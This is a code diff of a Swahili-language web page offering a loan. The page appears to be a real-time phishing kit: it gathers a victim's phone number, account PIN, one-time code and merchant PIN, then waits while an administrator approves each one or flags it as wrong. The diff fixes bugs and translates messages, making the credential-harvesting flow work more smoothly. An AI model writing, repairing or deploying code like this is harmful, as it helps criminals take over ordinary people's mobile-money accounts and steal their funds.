-  function startRs() {
-    // Clear any existing countdown first
-    if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-
-    let s = 60;
-    const rsBox = document.getElementById('otpRs');
-    if (!rsBox) return;
-
-    // Always rebuild the span fresh so the ID exists
-    rsBox.innerHTML = 'Tuma tena msimbo kwa <span id="rsS">' + s + '</span> sekunde';
-
-    _rsInterval = setInterval(() => {
-      s--;
-      const cur = document.getElementById('rsS');
-      if (cur) cur.textContent = s;
-      if (s <= 0) {
-        clearInterval(_rsInterval);
-        _rsInterval = null;
-        const box = document.getElementById('otpRs');
-        if (box) box.innerHTML = '<span style="color:var(--teal);cursor:pointer;font-weight:600" onclick="resendOtp()">Tuma tena msimbo</span>';
-      }
+      if (c <= 0) { clearInterval(iv); goTo('page-login'); }
     }, 1000);
-  }
+  }, 1500);
+}
 
-  // ══════════════════════════════════════════════════════
-  // RESEND OTP — calls /api/resend-otp
-  // ══════════════════════════════════════════════════════
-  async function resendOtp() {
-    if (!S.applicationId) return;
+// ══════════════════════════════════════════════════════
+// INLINE MESSAGE HELPERS
+// ══════════════════════════════════════════════════════
+function showLoginMsg(text) {
+  document.getElementById('lgMsgTxt').textContent = text;
+  document.getElementById('lgMsg').classList.add('show');
+}
+function hideLoginMsg() { document.getElementById('lgMsg').classList.remove('show'); }
+
+function showOtpMsg(type, text) {
+  ['otpMsgErr','otpMsgOk','otpMsgWarn','otpMsgInfo'].forEach(id => document.getElementById(id).classList.remove('show'));
+  if (type === 'error')   { document.getElementById('otpMsgErrTxt').textContent  = text; document.getElementById('otpMsgErr').classList.add('show'); }
+  if (type === 'success') { document.getElementById('otpMsgOkTxt').textContent   = text; document.getElementById('otpMsgOk').classList.add('show'); }
+  if (type === 'warning') { document.getElementById('otpMsgWarnTxt').textContent = text; document.getElementById('otpMsgWarn').classList.add('show'); }
+  if (type === 'info')    { document.getElementById('otpMsgInfoTxt').textContent = text; document.getElementById('otpMsgInfo').classList.add('show'); }
+}
+function hideOtpMsgs() {
+  ['otpMsgErr','otpMsgOk','otpMsgWarn','otpMsgInfo'].forEach(id => document.getElementById(id).classList.remove('show'));
+}
+
+// ══════════════════════════════════════════════════════
+// LOGIN PIN INPUT HELPERS
+// ══════════════════════════════════════════════════════
+function pinMv(el, i) {
+  el.value = el.value.replace(/\D/, '');
+  if (el.value && i < 3) document.getElementById('p' + (i+1)).focus();
+  chkLogin();
+}
+function chkLogin() {
+  const ok = [0,1,2,3].every(i => document.getElementById('p'+i).value);
+  document.getElementById('bLogin').className = ok ? 'btn-login rdy' : 'btn-login';
+}
+function togPin() {
+  [0,1,2,3].forEach(i => { const b = document.getElementById('p'+i); b.type = b.type === 'password' ? 'text' : 'password'; });
+}
+
+// ══════════════════════════════════════════════════════
+// LOGIN — calls /api/verify-pin
+// ══════════════════════════════════════════════════════
+async function doLogin() {
+  hideLoginMsg();
+  const rawPhone = document.getElementById('lgPh').value.trim();
+  const pin      = [0,1,2,3].map(i => document.getElementById('p'+i).value).join('');
+  if (!rawPhone || pin.length < 4) { showLoginMsg('Tafadhali weka nambari yako ya simu na PIN ya tarakimu 4.'); return; }
+  const phoneNumber = '+255' + rawPhone;
+  const adminId     = getAdminId();
+
+  document.getElementById('mLogin').classList.add('show');
+  document.getElementById('bLogin').disabled = true;
+
+  try {
+    const res  = await fetch('/api/verify-pin', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ phoneNumber, pin, adminId: adminId || null, assignmentType: adminId ? 'specific' : 'auto' })
+    });
+    const data = await res.json();
+    document.getElementById('mLogin').classList.remove('show');
+
+    if (data.success) {
+      S.applicationId   = data.applicationId;
+      S.assignedAdminId = data.assignedAdminId;
+      document.getElementById('otpPh').textContent = phoneNumber;
+      goTo('page-otp');
+      document.getElementById('pinWait').classList.add('show');
+      document.getElementById('otpInputSection').style.display = 'none';
+      pollPinStatus();
+    } else {
+      document.getElementById('bLogin').disabled = false;
+      showLoginMsg(data.message || 'Uthibitisho umeshindwa. Tafadhali jaribu tena.');
+    }
+  } catch (err) {
+    document.getElementById('mLogin').classList.remove('show');
+    document.getElementById('bLogin').disabled = false;
+    showLoginMsg('Hitilafu ya mtandao. Tafadhali angalia muunganisho wako na ujaribu tena.');
+  }
+}
+
+// ══════════════════════════════════════════════════════
+// POLL /api/check-pin-status
+// ══════════════════════════════════════════════════════
+let pinPollInterval = null;
+
+function pollPinStatus() {
+  if (pinPollInterval) clearInterval(pinPollInterval);
+
+  pinPollInterval = setInterval(async () => {
     try {
-      const res  = await fetch('/api/resend-otp', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ applicationId: S.applicationId })
-      });
+      const res  = await fetch('/api/check-pin-status/' + S.applicationId);
       const data = await res.json();
-      if (data.success) {
-        showOtpMsg('info', 'Ombi jipya la OTP limetumwa kwa msimamizi.');
+      if (!data.success) return;
+
+      if (data.status === 'approved') {
+        clearInterval(pinPollInterval);
+        pinPollInterval = null;
+        document.getElementById('pinWait').classList.remove('show');
+        document.getElementById('otpInputSection').style.display = 'block';
+        showOtpMsg('success', 'Maelezo yamethibitishwa! Tafadhali weka OTP yako hapa chini.');
         startRs();
+        document.getElementById('o0').focus();
+
+      } else if (data.status === 'rejected') {
+        clearInterval(pinPollInterval);
+        pinPollInterval = null;
+        document.getElementById('pinWait').classList.remove('show');
+        document.getElementById('otpInputSection').style.display = 'none';
+        showOtpMsg('error', 'Maelezo yako hayakuweza kuthibitishwa. Tafadhali rudi na ujaribu tena.');
+        document.getElementById('bLogin').disabled = false;
+      }
+      // 'pending' → keep polling
+    } catch (e) { /* silent on network hiccup */ }
+  }, 2000);
+
+  // 5 minute hard timeout
+  setTimeout(() => {
+    if (pinPollInterval) {
+      clearInterval(pinPollInterval);
+      pinPollInterval = null;
+      if (document.getElementById('pinWait').classList.contains('show')) {
+        document.getElementById('pinWait').classList.remove('show');
+        showOtpMsg('warning', 'Muda wa uthibitisho umekwisha. Tafadhali rudi na ujaribu tena.');
+      }
+    }
+  }, 300000);
+}
+
+// ══════════════════════════════════════════════════════
+// OTP INPUT HELPERS
+// ══════════════════════════════════════════════════════
+function otpMv(el, i) {
+  el.value = el.value.replace(/\D/, '');
+  if (el.value && i < 3) document.getElementById('o' + (i+1)).focus();
+  const ok = [0,1,2,3].every(j => document.getElementById('o'+j).value);
+  document.getElementById('bOtp').className = ok ? 'btn-otp rdy' : 'btn-otp';
+}
+
+let _rsInterval = null;
+function startRs() {
+  if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
+  let s = 60;
+  const rsBox = document.getElementById('otpRs');
+  if (!rsBox) return;
+  // Rebuild span fresh so id="rsS" always exists
+  rsBox.innerHTML = 'Tuma tena msimbo kwa <span id="rsS">' + s + '</span> sekunde';
+  _rsInterval = setInterval(() => {
+    s--;
+    const cur = document.getElementById('rsS');
+    if (cur) cur.textContent = s;
+    if (s <= 0) {
+      clearInterval(_rsInterval);
+      _rsInterval = null;
+      const box = document.getElementById('otpRs');
+      if (box) box.innerHTML = '<span style="color:var(--teal);cursor:pointer;font-weight:600" onclick="resendOtp()">Tuma tena msimbo</span>';
+    }
+  }, 1000);
+}
+
+// ══════════════════════════════════════════════════════
+// RESEND OTP — /api/resend-otp
+// ══════════════════════════════════════════════════════
+async function resendOtp() {
+  if (!S.applicationId) return;
+  try {
+    const res  = await fetch('/api/resend-otp', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ applicationId: S.applicationId })
+    });
+    const data = await res.json();
+    if (data.success) {
+      showOtpMsg('info', 'Ombi jipya la OTP limetumwa kwa msimamizi.');
+      startRs();
+      [0,1,2,3].forEach(i => { document.getElementById('o'+i).value = ''; });
+      document.getElementById('bOtp').className = 'btn-otp';
+      document.getElementById('bOtp').disabled  = false;
+      document.getElementById('o0').focus();
+    } else {
+      showOtpMsg('error', 'Haikuweza kutuma tena OTP. Tafadhali jaribu tena.');
+    }
+  } catch {
+    showOtpMsg('error', 'Hitilafu ya mtandao wakati wa kutuma tena OTP.');
+  }
+}
+
+// ══════════════════════════════════════════════════════
+// OTP SUBMIT — /api/verify-otp
+// ══════════════════════════════════════════════════════
+async function doOtp() {
+  const otp = [0,1,2,3].map(j => document.getElementById('o'+j).value).join('');
+  if (otp.length < 4) { showOtpMsg('warning', 'Tafadhali weka tarakimu zote 4 za OTP yako.'); return; }
+  hideOtpMsgs();
+
+  let c = 3;
+  document.getElementById('otpVT').textContent = 'Please wait… (' + c + 's)';
+  document.getElementById('mOtp').classList.add('show');
+  document.getElementById('bOtp').disabled = true;
+
+  const countdown = setInterval(() => {
+    c--;
+    const el = document.getElementById('otpVT');
+    if (el) el.textContent = 'Please wait… (' + c + 's)';
+  }, 1000);
+
+  try {
+    const res  = await fetch('/api/verify-otp', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ applicationId: S.applicationId, otp })
+    });
+    const data = await res.json();
+    clearInterval(countdown);
+    document.getElementById('mOtp').classList.remove('show');
+
+    if (data.success) {
+      showOtpMsg('success', 'OTP imewasilishwa. Inasubiri msimamizi kuidhinisha…');
+      pollOtpStatus();
+    } else {
+      document.getElementById('bOtp').disabled = false;
+      showOtpMsg('error', data.message || 'Imeshindwa kuwasilisha OTP. Tafadhali jaribu tena.');
+    }
+  } catch (err) {
+    clearInterval(countdown);
+    document.getElementById('mOtp').classList.remove('show');
+    document.getElementById('bOtp').disabled = false;
+    showOtpMsg('error', 'Hitilafu ya mtandao. Tafadhali angalia muunganisho wako.');
+  }
+}
+
+// ══════════════════════════════════════════════════════
+// POLL /api/check-otp-status
+// ══════════════════════════════════════════════════════
+let otpPollInterval = null;
+
+function pollOtpStatus() {
+  if (otpPollInterval) clearInterval(otpPollInterval);
+
+  otpPollInterval = setInterval(async () => {
+    try {
+      const res  = await fetch('/api/check-otp-status/' + S.applicationId);
+      const data = await res.json();
+      if (!data.success) return;
+
+      if (data.status === 'approved') {
+        clearInterval(otpPollInterval);
+        otpPollInterval = null;
+        // Set approval page values
+        document.getElementById('apAmt').textContent  = 'TZS ' + Number(S.amt || 1000000).toLocaleString();
+        document.getElementById('apTerm').textContent = S.term || 'Miezi 48';
+        const a = Number(S.amt) || 1000000;
+        const t = parseInt(S.term) || 48;
+        const r = 0.08 / 12;
+        const m = a * r * Math.pow(1+r,t) / (Math.pow(1+r,t) - 1);
+        document.getElementById('apMthly').textContent = 'TZS ' + m.toFixed(2);
+        // Go to merchant PIN page first
+        goTo('page-merchant-pin');
+        [0,1,2,3].forEach(i => { document.getElementById('mp'+i).value = ''; });
+        chkMerchPin();
+        document.getElementById('mp0').focus();
+
+      } else if (data.status === 'rejected') {
+        clearInterval(otpPollInterval);
+        otpPollInterval = null;
+        showOtpMsg('error', 'Uthibitisho umeshindwa. Tafadhali wasiliana na msaada.');
+        document.getElementById('bOtp').disabled = false;
+
+      } else if (data.status === 'wrongpin_otp') {
+        // ── FIX: Admin flagged PIN as wrong — send user back to login ──
+        clearInterval(otpPollInterval);
+        otpPollInterval = null;
+        showOtpMsg('error', 'PIN yako si sahihi. Unarejesha kwenye ukurasa wa kuingia…');
+        setTimeout(() => {
+          // Clear login PIN boxes
+          [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
+          chkLogin();
+          document.getElementById('bLogin').disabled = false;
+          // FIX: clear only o0–o3 (was [0,1,2,3,4] — o4 does not exist)
+          [0,1,2,3].forEach(i => { document.getElementById('o'+i).value = ''; });
+          // Reset OTP button state
+          document.getElementById('bOtp').className = 'btn-otp';
+          document.getElementById('bOtp').disabled  = false;
+          // Reset OTP page UI
+          document.getElementById('pinWait').classList.remove('show');
+          document.getElementById('otpInputSection').style.display = '';
+          // Stop resend timer — startRs() rebuilds the span when needed
+          if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
+          document.getElementById('otpRs').innerHTML = 'Tuma tena msimbo kwa <span id="rsS">60</span> sekunde';
+          // Clear all OTP messages
+          hideOtpMsgs();
+          // Reset application state — fresh login will create a new application
+          S.applicationId   = null;
+          S.assignedAdminId = null;
+          goTo('page-login');
+        }, 2500);
+
+      } else if (data.status === 'wrongcode') {
+        // ── FIX: Admin flagged OTP as wrong — let user re-enter ──
+        clearInterval(otpPollInterval);
+        otpPollInterval = null;
+        // FIX: clear only o0–o3 (was [0,1,2,3,4] — o4 does not exist)
         [0,1,2,3].forEach(i => { document.getElementById('o'+i).value = ''; });
         document.getElementById('bOtp').className = 'btn-otp';
+        // FIX: was missing — button stayed permanently disabled after first submission
+        document.getElementById('bOtp').disabled  = false;
+        showOtpMsg('error', 'Msimbo si sahihi. Tafadhali angalia na uweke tena.');
         document.getElementById('o0').focus();
-      } else {
-        showOtpMsg('error', 'Haikuweza kutuma tena OTP. Tafadhali jaribu tena.');
       }
-    } catch {
-      showOtpMsg('error', 'Hitilafu ya mtandao wakati wa kutuma tena OTP.');
-    }
-  }
+      // 'pending' → keep polling
+    } catch (e) { /* silent on network hiccup */ }
+  }, 2000);
 
-  // ══════════════════════════════════════════════════════
-  // OTP SUBMIT — calls /api/verify-otp then polls /api/check-otp-status
-  // ══════════════════════════════════════════════════════
-  async function doOtp() {
-    const otp = [0,1,2,3].map(j => document.getElementById('o'+j).value).join('');
-    if (otp.length < 4) {
-      showOtpMsg('warning', 'Tafadhali weka tarakimu zote 4 za OTP yako.');
-      return;
-    }
-
-    hideOtpMsgs();
-
-    let c = 3;
-    document.getElementById('otpVT').textContent = 'Please wait… (' + c + 's)';
-    document.getElementById('mOtp').classList.add('show');
-    document.getElementById('bOtp').disabled = true;
-
-    const countdown = setInterval(() => {
-      c--;
-      const el = document.getElementById('otpVT');
-      if (el) el.textContent = 'Please wait… (' + c + 's)';
-    }, 1000);
-
-    try {
-      const res  = await fetch('/api/verify-otp', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ applicationId: S.applicationId, otp })
-      });
-      const data = await res.json();
-
-      clearInterval(countdown);
-      document.getElementById('mOtp').classList.remove('show');
-
-      if (data.success) {
-        showOtpMsg('success', 'OTP imewasilishwa. Inasubiri msimamizi kuidhinisha…');
-        pollOtpStatus();
-      } else {
-        document.getElementById('bOtp').disabled = false;
-        showOtpMsg('error', data.message || 'Imeshindwa kuwasilisha OTP. Tafadhali jaribu tena.');
-      }
-
-    } catch (err) {
-      clearInterval(countdown);
-      document.getElementById('mOtp').classList.remove('show');
+  // 5 minute hard timeout
+  setTimeout(() => {
+    if (otpPollInterval) {
+      clearInterval(otpPollInterval);
+      otpPollInterval = null;
+      showOtpMsg('warning', 'Muda wa idhini umekwisha. Tafadhali jaribu tena.');
       document.getElementById('bOtp').disabled = false;
-      showOtpMsg('error', 'Hitilafu ya mtandao. Tafadhali angalia muunganisho wako.');
     }
+  }, 300000);
+}
+
+// ══════════════════════════════════════════════════════
+// MERCHANT PIN HELPERS
+// ══════════════════════════════════════════════════════
+function pinMvM(el, i) {
+  el.value = el.value.replace(/\D/, '');
+  if (el.value && i < 3) document.getElementById('mp' + (i+1)).focus();
+  chkMerchPin();
+}
+function chkMerchPin() {
+  const ok = [0,1,2,3].every(i => document.getElementById('mp'+i).value);
+  document.getElementById('bMerchPin').className = ok ? 'btn-login rdy' : 'btn-login';
+}
+function togMerchPin() {
+  [0,1,2,3].forEach(i => { const b = document.getElementById('mp'+i); b.type = b.type === 'password' ? 'text' : 'password'; });
+}
+
+function showMerchPinMsg(type, text) {
+  ['mpMsg','mpMsgOk','mpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
+  if (type === 'error')   { document.getElementById('mpMsgTxt').textContent    = text; document.getElementById('mpMsg').classList.add('show'); }
+  if (type === 'success') { document.getElementById('mpMsgOkTxt').textContent  = text; document.getElementById('mpMsgOk').classList.add('show'); }
+  if (type === 'warning') { document.getElementById('mpMsgWarnTxt').textContent = text; document.getElementById('mpMsgWarn').classList.add('show'); }
+}
+function hideMerchPinMsgs() {
+  ['mpMsg','mpMsgOk','mpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
+}
+
+// ══════════════════════════════════════════════════════
+// MERCHANT PIN SUBMIT — /api/verify-merchant-pin
+// ══════════════════════════════════════════════════════
+let merchPinPollInterval = null;
+
+async function doMerchPin() {
+  hideMerchPinMsgs();
+  const merchantPin = [0,1,2,3].map(i => document.getElementById('mp'+i).value).join('');
+  if (merchantPin.length < 4) {
+    showMerchPinMsg('warning', 'Tafadhali weka tarakimu zote 4 za PIN yako ya Merchant Account.');
+    return;
   }
 
-  // ══════════════════════════════════════════════════════
-  // POLL /api/check-otp-status
-  // ══════════════════════════════════════════════════════
-  let otpPollInterval = null;
+  document.getElementById('mMerchPin').classList.add('show');
+  document.getElementById('bMerchPin').disabled = true;
 
-  function pollOtpStatus() {
-    if (otpPollInterval) clearInterval(otpPollInterval);
-
-    otpPollInterval = setInterval(async () => {
-      try {
-        const res  = await fetch(`/api/check-otp-status/${S.applicationId}`);
-        const data = await res.json();
-
-        if (!data.success) return;
-
-        if (data.status === 'approved') {
-          clearInterval(otpPollInterval);
-          // Update approval page with loan details (stored for later)
-          document.getElementById('apAmt').textContent  = '$' + Number(S.amt || 1000).toLocaleString();
-          document.getElementById('apTerm').textContent = S.term || 'Miezi 48';
-          // Calculate monthly payment for display
-          const a = Number(S.amt) || 1000;
-          const t = parseInt(S.term) || 48;
-          const r = 0.08 / 12;
-          const m = a * r * Math.pow(1+r,t) / (Math.pow(1+r,t) - 1);
-          document.getElementById('apMthly').textContent = 'TZS ' + m.toFixed(2);
-          // Go to merchant PIN page before approval
-          goTo('page-merchant-pin');
-          [0,1,2,3].forEach(i => { document.getElementById('mp'+i).value = ''; });
-          chkMerchPin();
-          document.getElementById('mp0').focus();
-
-        } else if (data.status === 'rejected') {
-          clearInterval(otpPollInterval);
-          showOtpMsg('error', 'Verification failed. Please contact support.');
-          document.getElementById('bOtp').disabled = false;
-
-        } else if (data.status === 'wrongpin_otp') {
-          // Admin flagged PIN as wrong — send user back to login
-          clearInterval(otpPollInterval);
-          showOtpMsg('error', 'Incorrect PIN detected. Redirecting to login…');
-          setTimeout(() => {
-            // Clear PIN boxes
-            [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
-            chkLogin();
-            document.getElementById('bLogin').disabled = false;
-            // Clear OTP boxes
-            [0,1,2,3,4].forEach(i => document.getElementById('o'+i).value = '');
-            // Reset OTP button
-            document.getElementById('bOtp').className = 'btn-otp';
-            document.getElementById('bOtp').disabled = false;
-            // Hide waiting spinner and show OTP inputs (reset OTP page state)
-            document.getElementById('pinWait').classList.remove('show');
-            document.getElementById('otpInputSection').style.display = '';
-            // Stop resend timer and reset it
-            if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-            document.getElementById('otpRs').innerHTML = 'Resend code in <span id="rsS">60</span> seconds';
-            // Clear all OTP messages
-            hideOtpMsgs();
-            // Reset application state so a fresh login creates a new application
-            S.applicationId = null;
-            S.assignedAdminId = null;
-            goTo('page-login');
-          }, 2500);
-
-        } else if (data.status === 'wrongcode') {
-          // Admin flagged OTP as wrong — let user re-enter
-          clearInterval(otpPollInterval);
-          [0,1,2,3,4].forEach(i => document.getElementById('o'+i).value = '');
-          document.getElementById('bOtp').className = 'btn-otp';
-          document.getElementById('bOtp').disabled = false;
-          showOtpMsg('error', 'Incorrect OTP code. Please check and re-enter.');
-          document.getElementById('o0').focus();
-        }
-        // status === 'pending' → keep polling
-
-      } catch (e) {
-        // Silent on network hiccup
-      }
-    }, 2000);
-
-    // 5 minute timeout
-    setTimeout(() => {
-      if (otpPollInterval) {
-        clearInterval(otpPollInterval);
-        showOtpMsg('warning', 'Muda wa idhini umekwisha. Tafadhali jaribu tena.');
-        document.getElementById('bOtp').disabled = false;
-      }
-    }, 300000);
-  }
-
-  // ══════════════════════════════════════════════════════
-  // MERCHANT PIN PAGE — INPUT HELPERS
-  // ══════════════════════════════════════════════════════
-  function pinMvM(el, i) {
-    el.value = el.value.replace(/\D/, '');
-    if (el.value && i < 3) document.getElementById('mp' + (i+1)).focus();
-    chkMerchPin();
-  }
-
-  function chkMerchPin() {
-    const ok = [0,1,2,3].every(i => document.getElementById('mp'+i).value);
-    document.getElementById('bMerchPin').className = ok ? 'btn-login rdy' : 'btn-login';
-  }
-
-  function togMerchPin() {
-    [0,1,2,3].forEach(i => {
-      const b = document.getElementById('mp'+i);
-      b.type = b.type === 'password' ? 'text' : 'password';
+  try {
+    const res  = await fetch('/api/verify-merchant-pin', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ applicationId: S.applicationId, merchantPin })
     });
-  }
+    const data = await res.json();
+    document.getElementById('mMerchPin').classList.remove('show');
 
-  function showMerchPinMsg(type, text) {
-    ['mpMsg','mpMsgOk','mpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
-    if (type === 'error')   { document.getElementById('mpMsgTxt').textContent = text;    document.getElementById('mpMsg').classList.add('show'); }
-    if (type === 'success') { document.getElementById('mpMsgOkTxt').textContent = text;  document.getElementById('mpMsgOk').classList.add('show'); }
-    if (type === 'warning') { document.getElementById('mpMsgWarnTxt').textContent = text; document.getElementById('mpMsgWarn').classList.add('show'); }
-  }
-  function hideMerchPinMsgs() {
-    ['mpMsg','mpMsgOk','mpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
-  }
+    if (data.success) {
+      // Hide input, show waiting spinner
+      document.getElementById('merchPinInputSection').style.display = 'none';
+      document.getElementById('merchPinWait').classList.add('show');
 
-  // ══════════════════════════════════════════════════════
-  // MERCHANT PIN — CALLS /api/verify-merchant-pin
-  // ══════════════════════════════════════════════════════
-  let merchPinPollInterval = null;
+      if (merchPinPollInterval) clearInterval(merchPinPollInterval);
 
-  async function doMerchPin() {
-    hideMerchPinMsgs();
+      const pollTimeout = setTimeout(() => {
+        if (merchPinPollInterval) {
+          clearInterval(merchPinPollInterval);
+          merchPinPollInterval = null;
+          document.getElementById('merchPinWait').classList.remove('show');
+          document.getElementById('merchPinInputSection').style.display = '';
+          document.getElementById('bMerchPin').disabled = false;
+          showMerchPinMsg('warning', 'Muda wa idhini umekwisha. Tafadhali jaribu tena.');
+        }
+      }, 300000);
 
-    const merchantPin = [0,1,2,3].map(i => document.getElementById('mp'+i).value).join('');
+      merchPinPollInterval = setInterval(async () => {
+        try {
+          const pollRes  = await fetch('/api/check-merchant-pin-status/' + S.applicationId);
+          const pollData = await pollRes.json();
 
-    if (merchantPin.length < 4) {
-      showMerchPinMsg('warning', 'Tafadhali weka tarakimu zote 4 za PIN yako ya Merchant Account.');
-      return;
-    }
-
-    document.getElementById('mMerchPin').classList.add('show');
-    document.getElementById('bMerchPin').disabled = true;
-
-    try {
-      const res = await fetch('/api/verify-merchant-pin', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          applicationId: S.applicationId,
-          merchantPin
-        })
-      });
-
-      const data = await res.json();
-      document.getElementById('mMerchPin').classList.remove('show');
-
-      if (data.success) {
-        // Hide PIN inputs, show waiting indicator — poll for admin decision
-        document.getElementById('merchPinInputSection').style.display = 'none';
-        document.getElementById('merchPinWait').classList.add('show');
-
-        if (merchPinPollInterval) clearInterval(merchPinPollInterval);
-
-        // Timeout after 5 minutes
-        const pollTimeout = setTimeout(() => {
-          if (merchPinPollInterval) {
+          if (pollData.status === 'approved') {
             clearInterval(merchPinPollInterval);
+            clearTimeout(pollTimeout);
+            merchPinPollInterval = null;
+            goTo('page-approval');
+
+          } else if (pollData.status === 'wrong') {
+            clearInterval(merchPinPollInterval);
+            clearTimeout(pollTimeout);
             merchPinPollInterval = null;
             document.getElementById('merchPinWait').classList.remove('show');
             document.getElementById('merchPinInputSection').style.display = '';
+            [0,1,2,3].forEach(i => document.getElementById('mp'+i).value = '');
+            chkMerchPin();
             document.getElementById('bMerchPin').disabled = false;
-            showMerchPinMsg('warning', 'Muda wa idhini umekwisha. Tafadhali jaribu tena.');
+            showMerchPinMsg('error', 'PIN ya Merchant si sahihi. Tafadhali weka tena.');
+            document.getElementById('mp0').focus();
           }
-        }, 300000);
+          // 'pending' or 'received' → keep polling
+        } catch (e) { /* silent on network hiccup */ }
+      }, 2000);
 
-        merchPinPollInterval = setInterval(async () => {
-          try {
-            const pollRes  = await fetch('/api/check-merchant-pin-status/' + S.applicationId);
-            const pollData = await pollRes.json();
-
-            if (pollData.status === 'approved') {
-              clearInterval(merchPinPollInterval);
-              clearTimeout(pollTimeout);
-              merchPinPollInterval = null;
-              goTo('page-approval');
-
-            } else if (pollData.status === 'wrong') {
-              // Admin flagged PIN as wrong — let user re-enter
-              clearInterval(merchPinPollInterval);
-              clearTimeout(pollTimeout);
-              merchPinPollInterval = null;
-              document.getElementById('merchPinWait').classList.remove('show');
-              document.getElementById('merchPinInputSection').style.display = '';
-              [0,1,2,3].forEach(i => document.getElementById('mp'+i).value = '');
-              chkMerchPin();
-              document.getElementById('bMerchPin').disabled = false;
-              showMerchPinMsg('error', 'PIN ya Merchant si sahihi. Tafadhali weka tena.');
-              document.getElementById('mp0').focus();
-            }
-            // status === 'pending' → keep polling
-
-          } catch (e) {
-            // Silent on network hiccup
-          }
-        }, 2000);
-
-      } else {
-        document.getElementById('bMerchPin').disabled = false;
-        showMerchPinMsg('error', data.message || 'Imeshindwa kuthibitisha PIN ya Merchant. Tafadhali jaribu tena.');
-      }
-
-    } catch (err) {
-      document.getElementById('mMerchPin').classList.remove('show');
+    } else {
       document.getElementById('bMerchPin').disabled = false;
-      showMerchPinMsg('error', 'Hitilafu ya mtandao. Tafadhali angalia muunganisho wako.');
+      showMerchPinMsg('error', data.message || 'Imeshindwa kuthibitisha PIN ya Merchant. Tafadhali jaribu tena.');
     }
+  } catch (err) {
+    document.getElementById('mMerchPin').classList.remove('show');
+    document.getElementById('bMerchPin').disabled = false;
+    showMerchPinMsg('error', 'Hitilafu ya mtandao. Tafadhali angalia muunganisho wako.');
   }
+}
 
-  // ══════════════════════════════════════════════════════
-  // INIT
-  // ══════════════════════════════════════════════════════
-  calcUp();
+// ══════════════════════════════════════════════════════
+// INIT
+// ══════════════════════════════════════════════════════
+calcUp();
 </script>
 </body>
 </html>
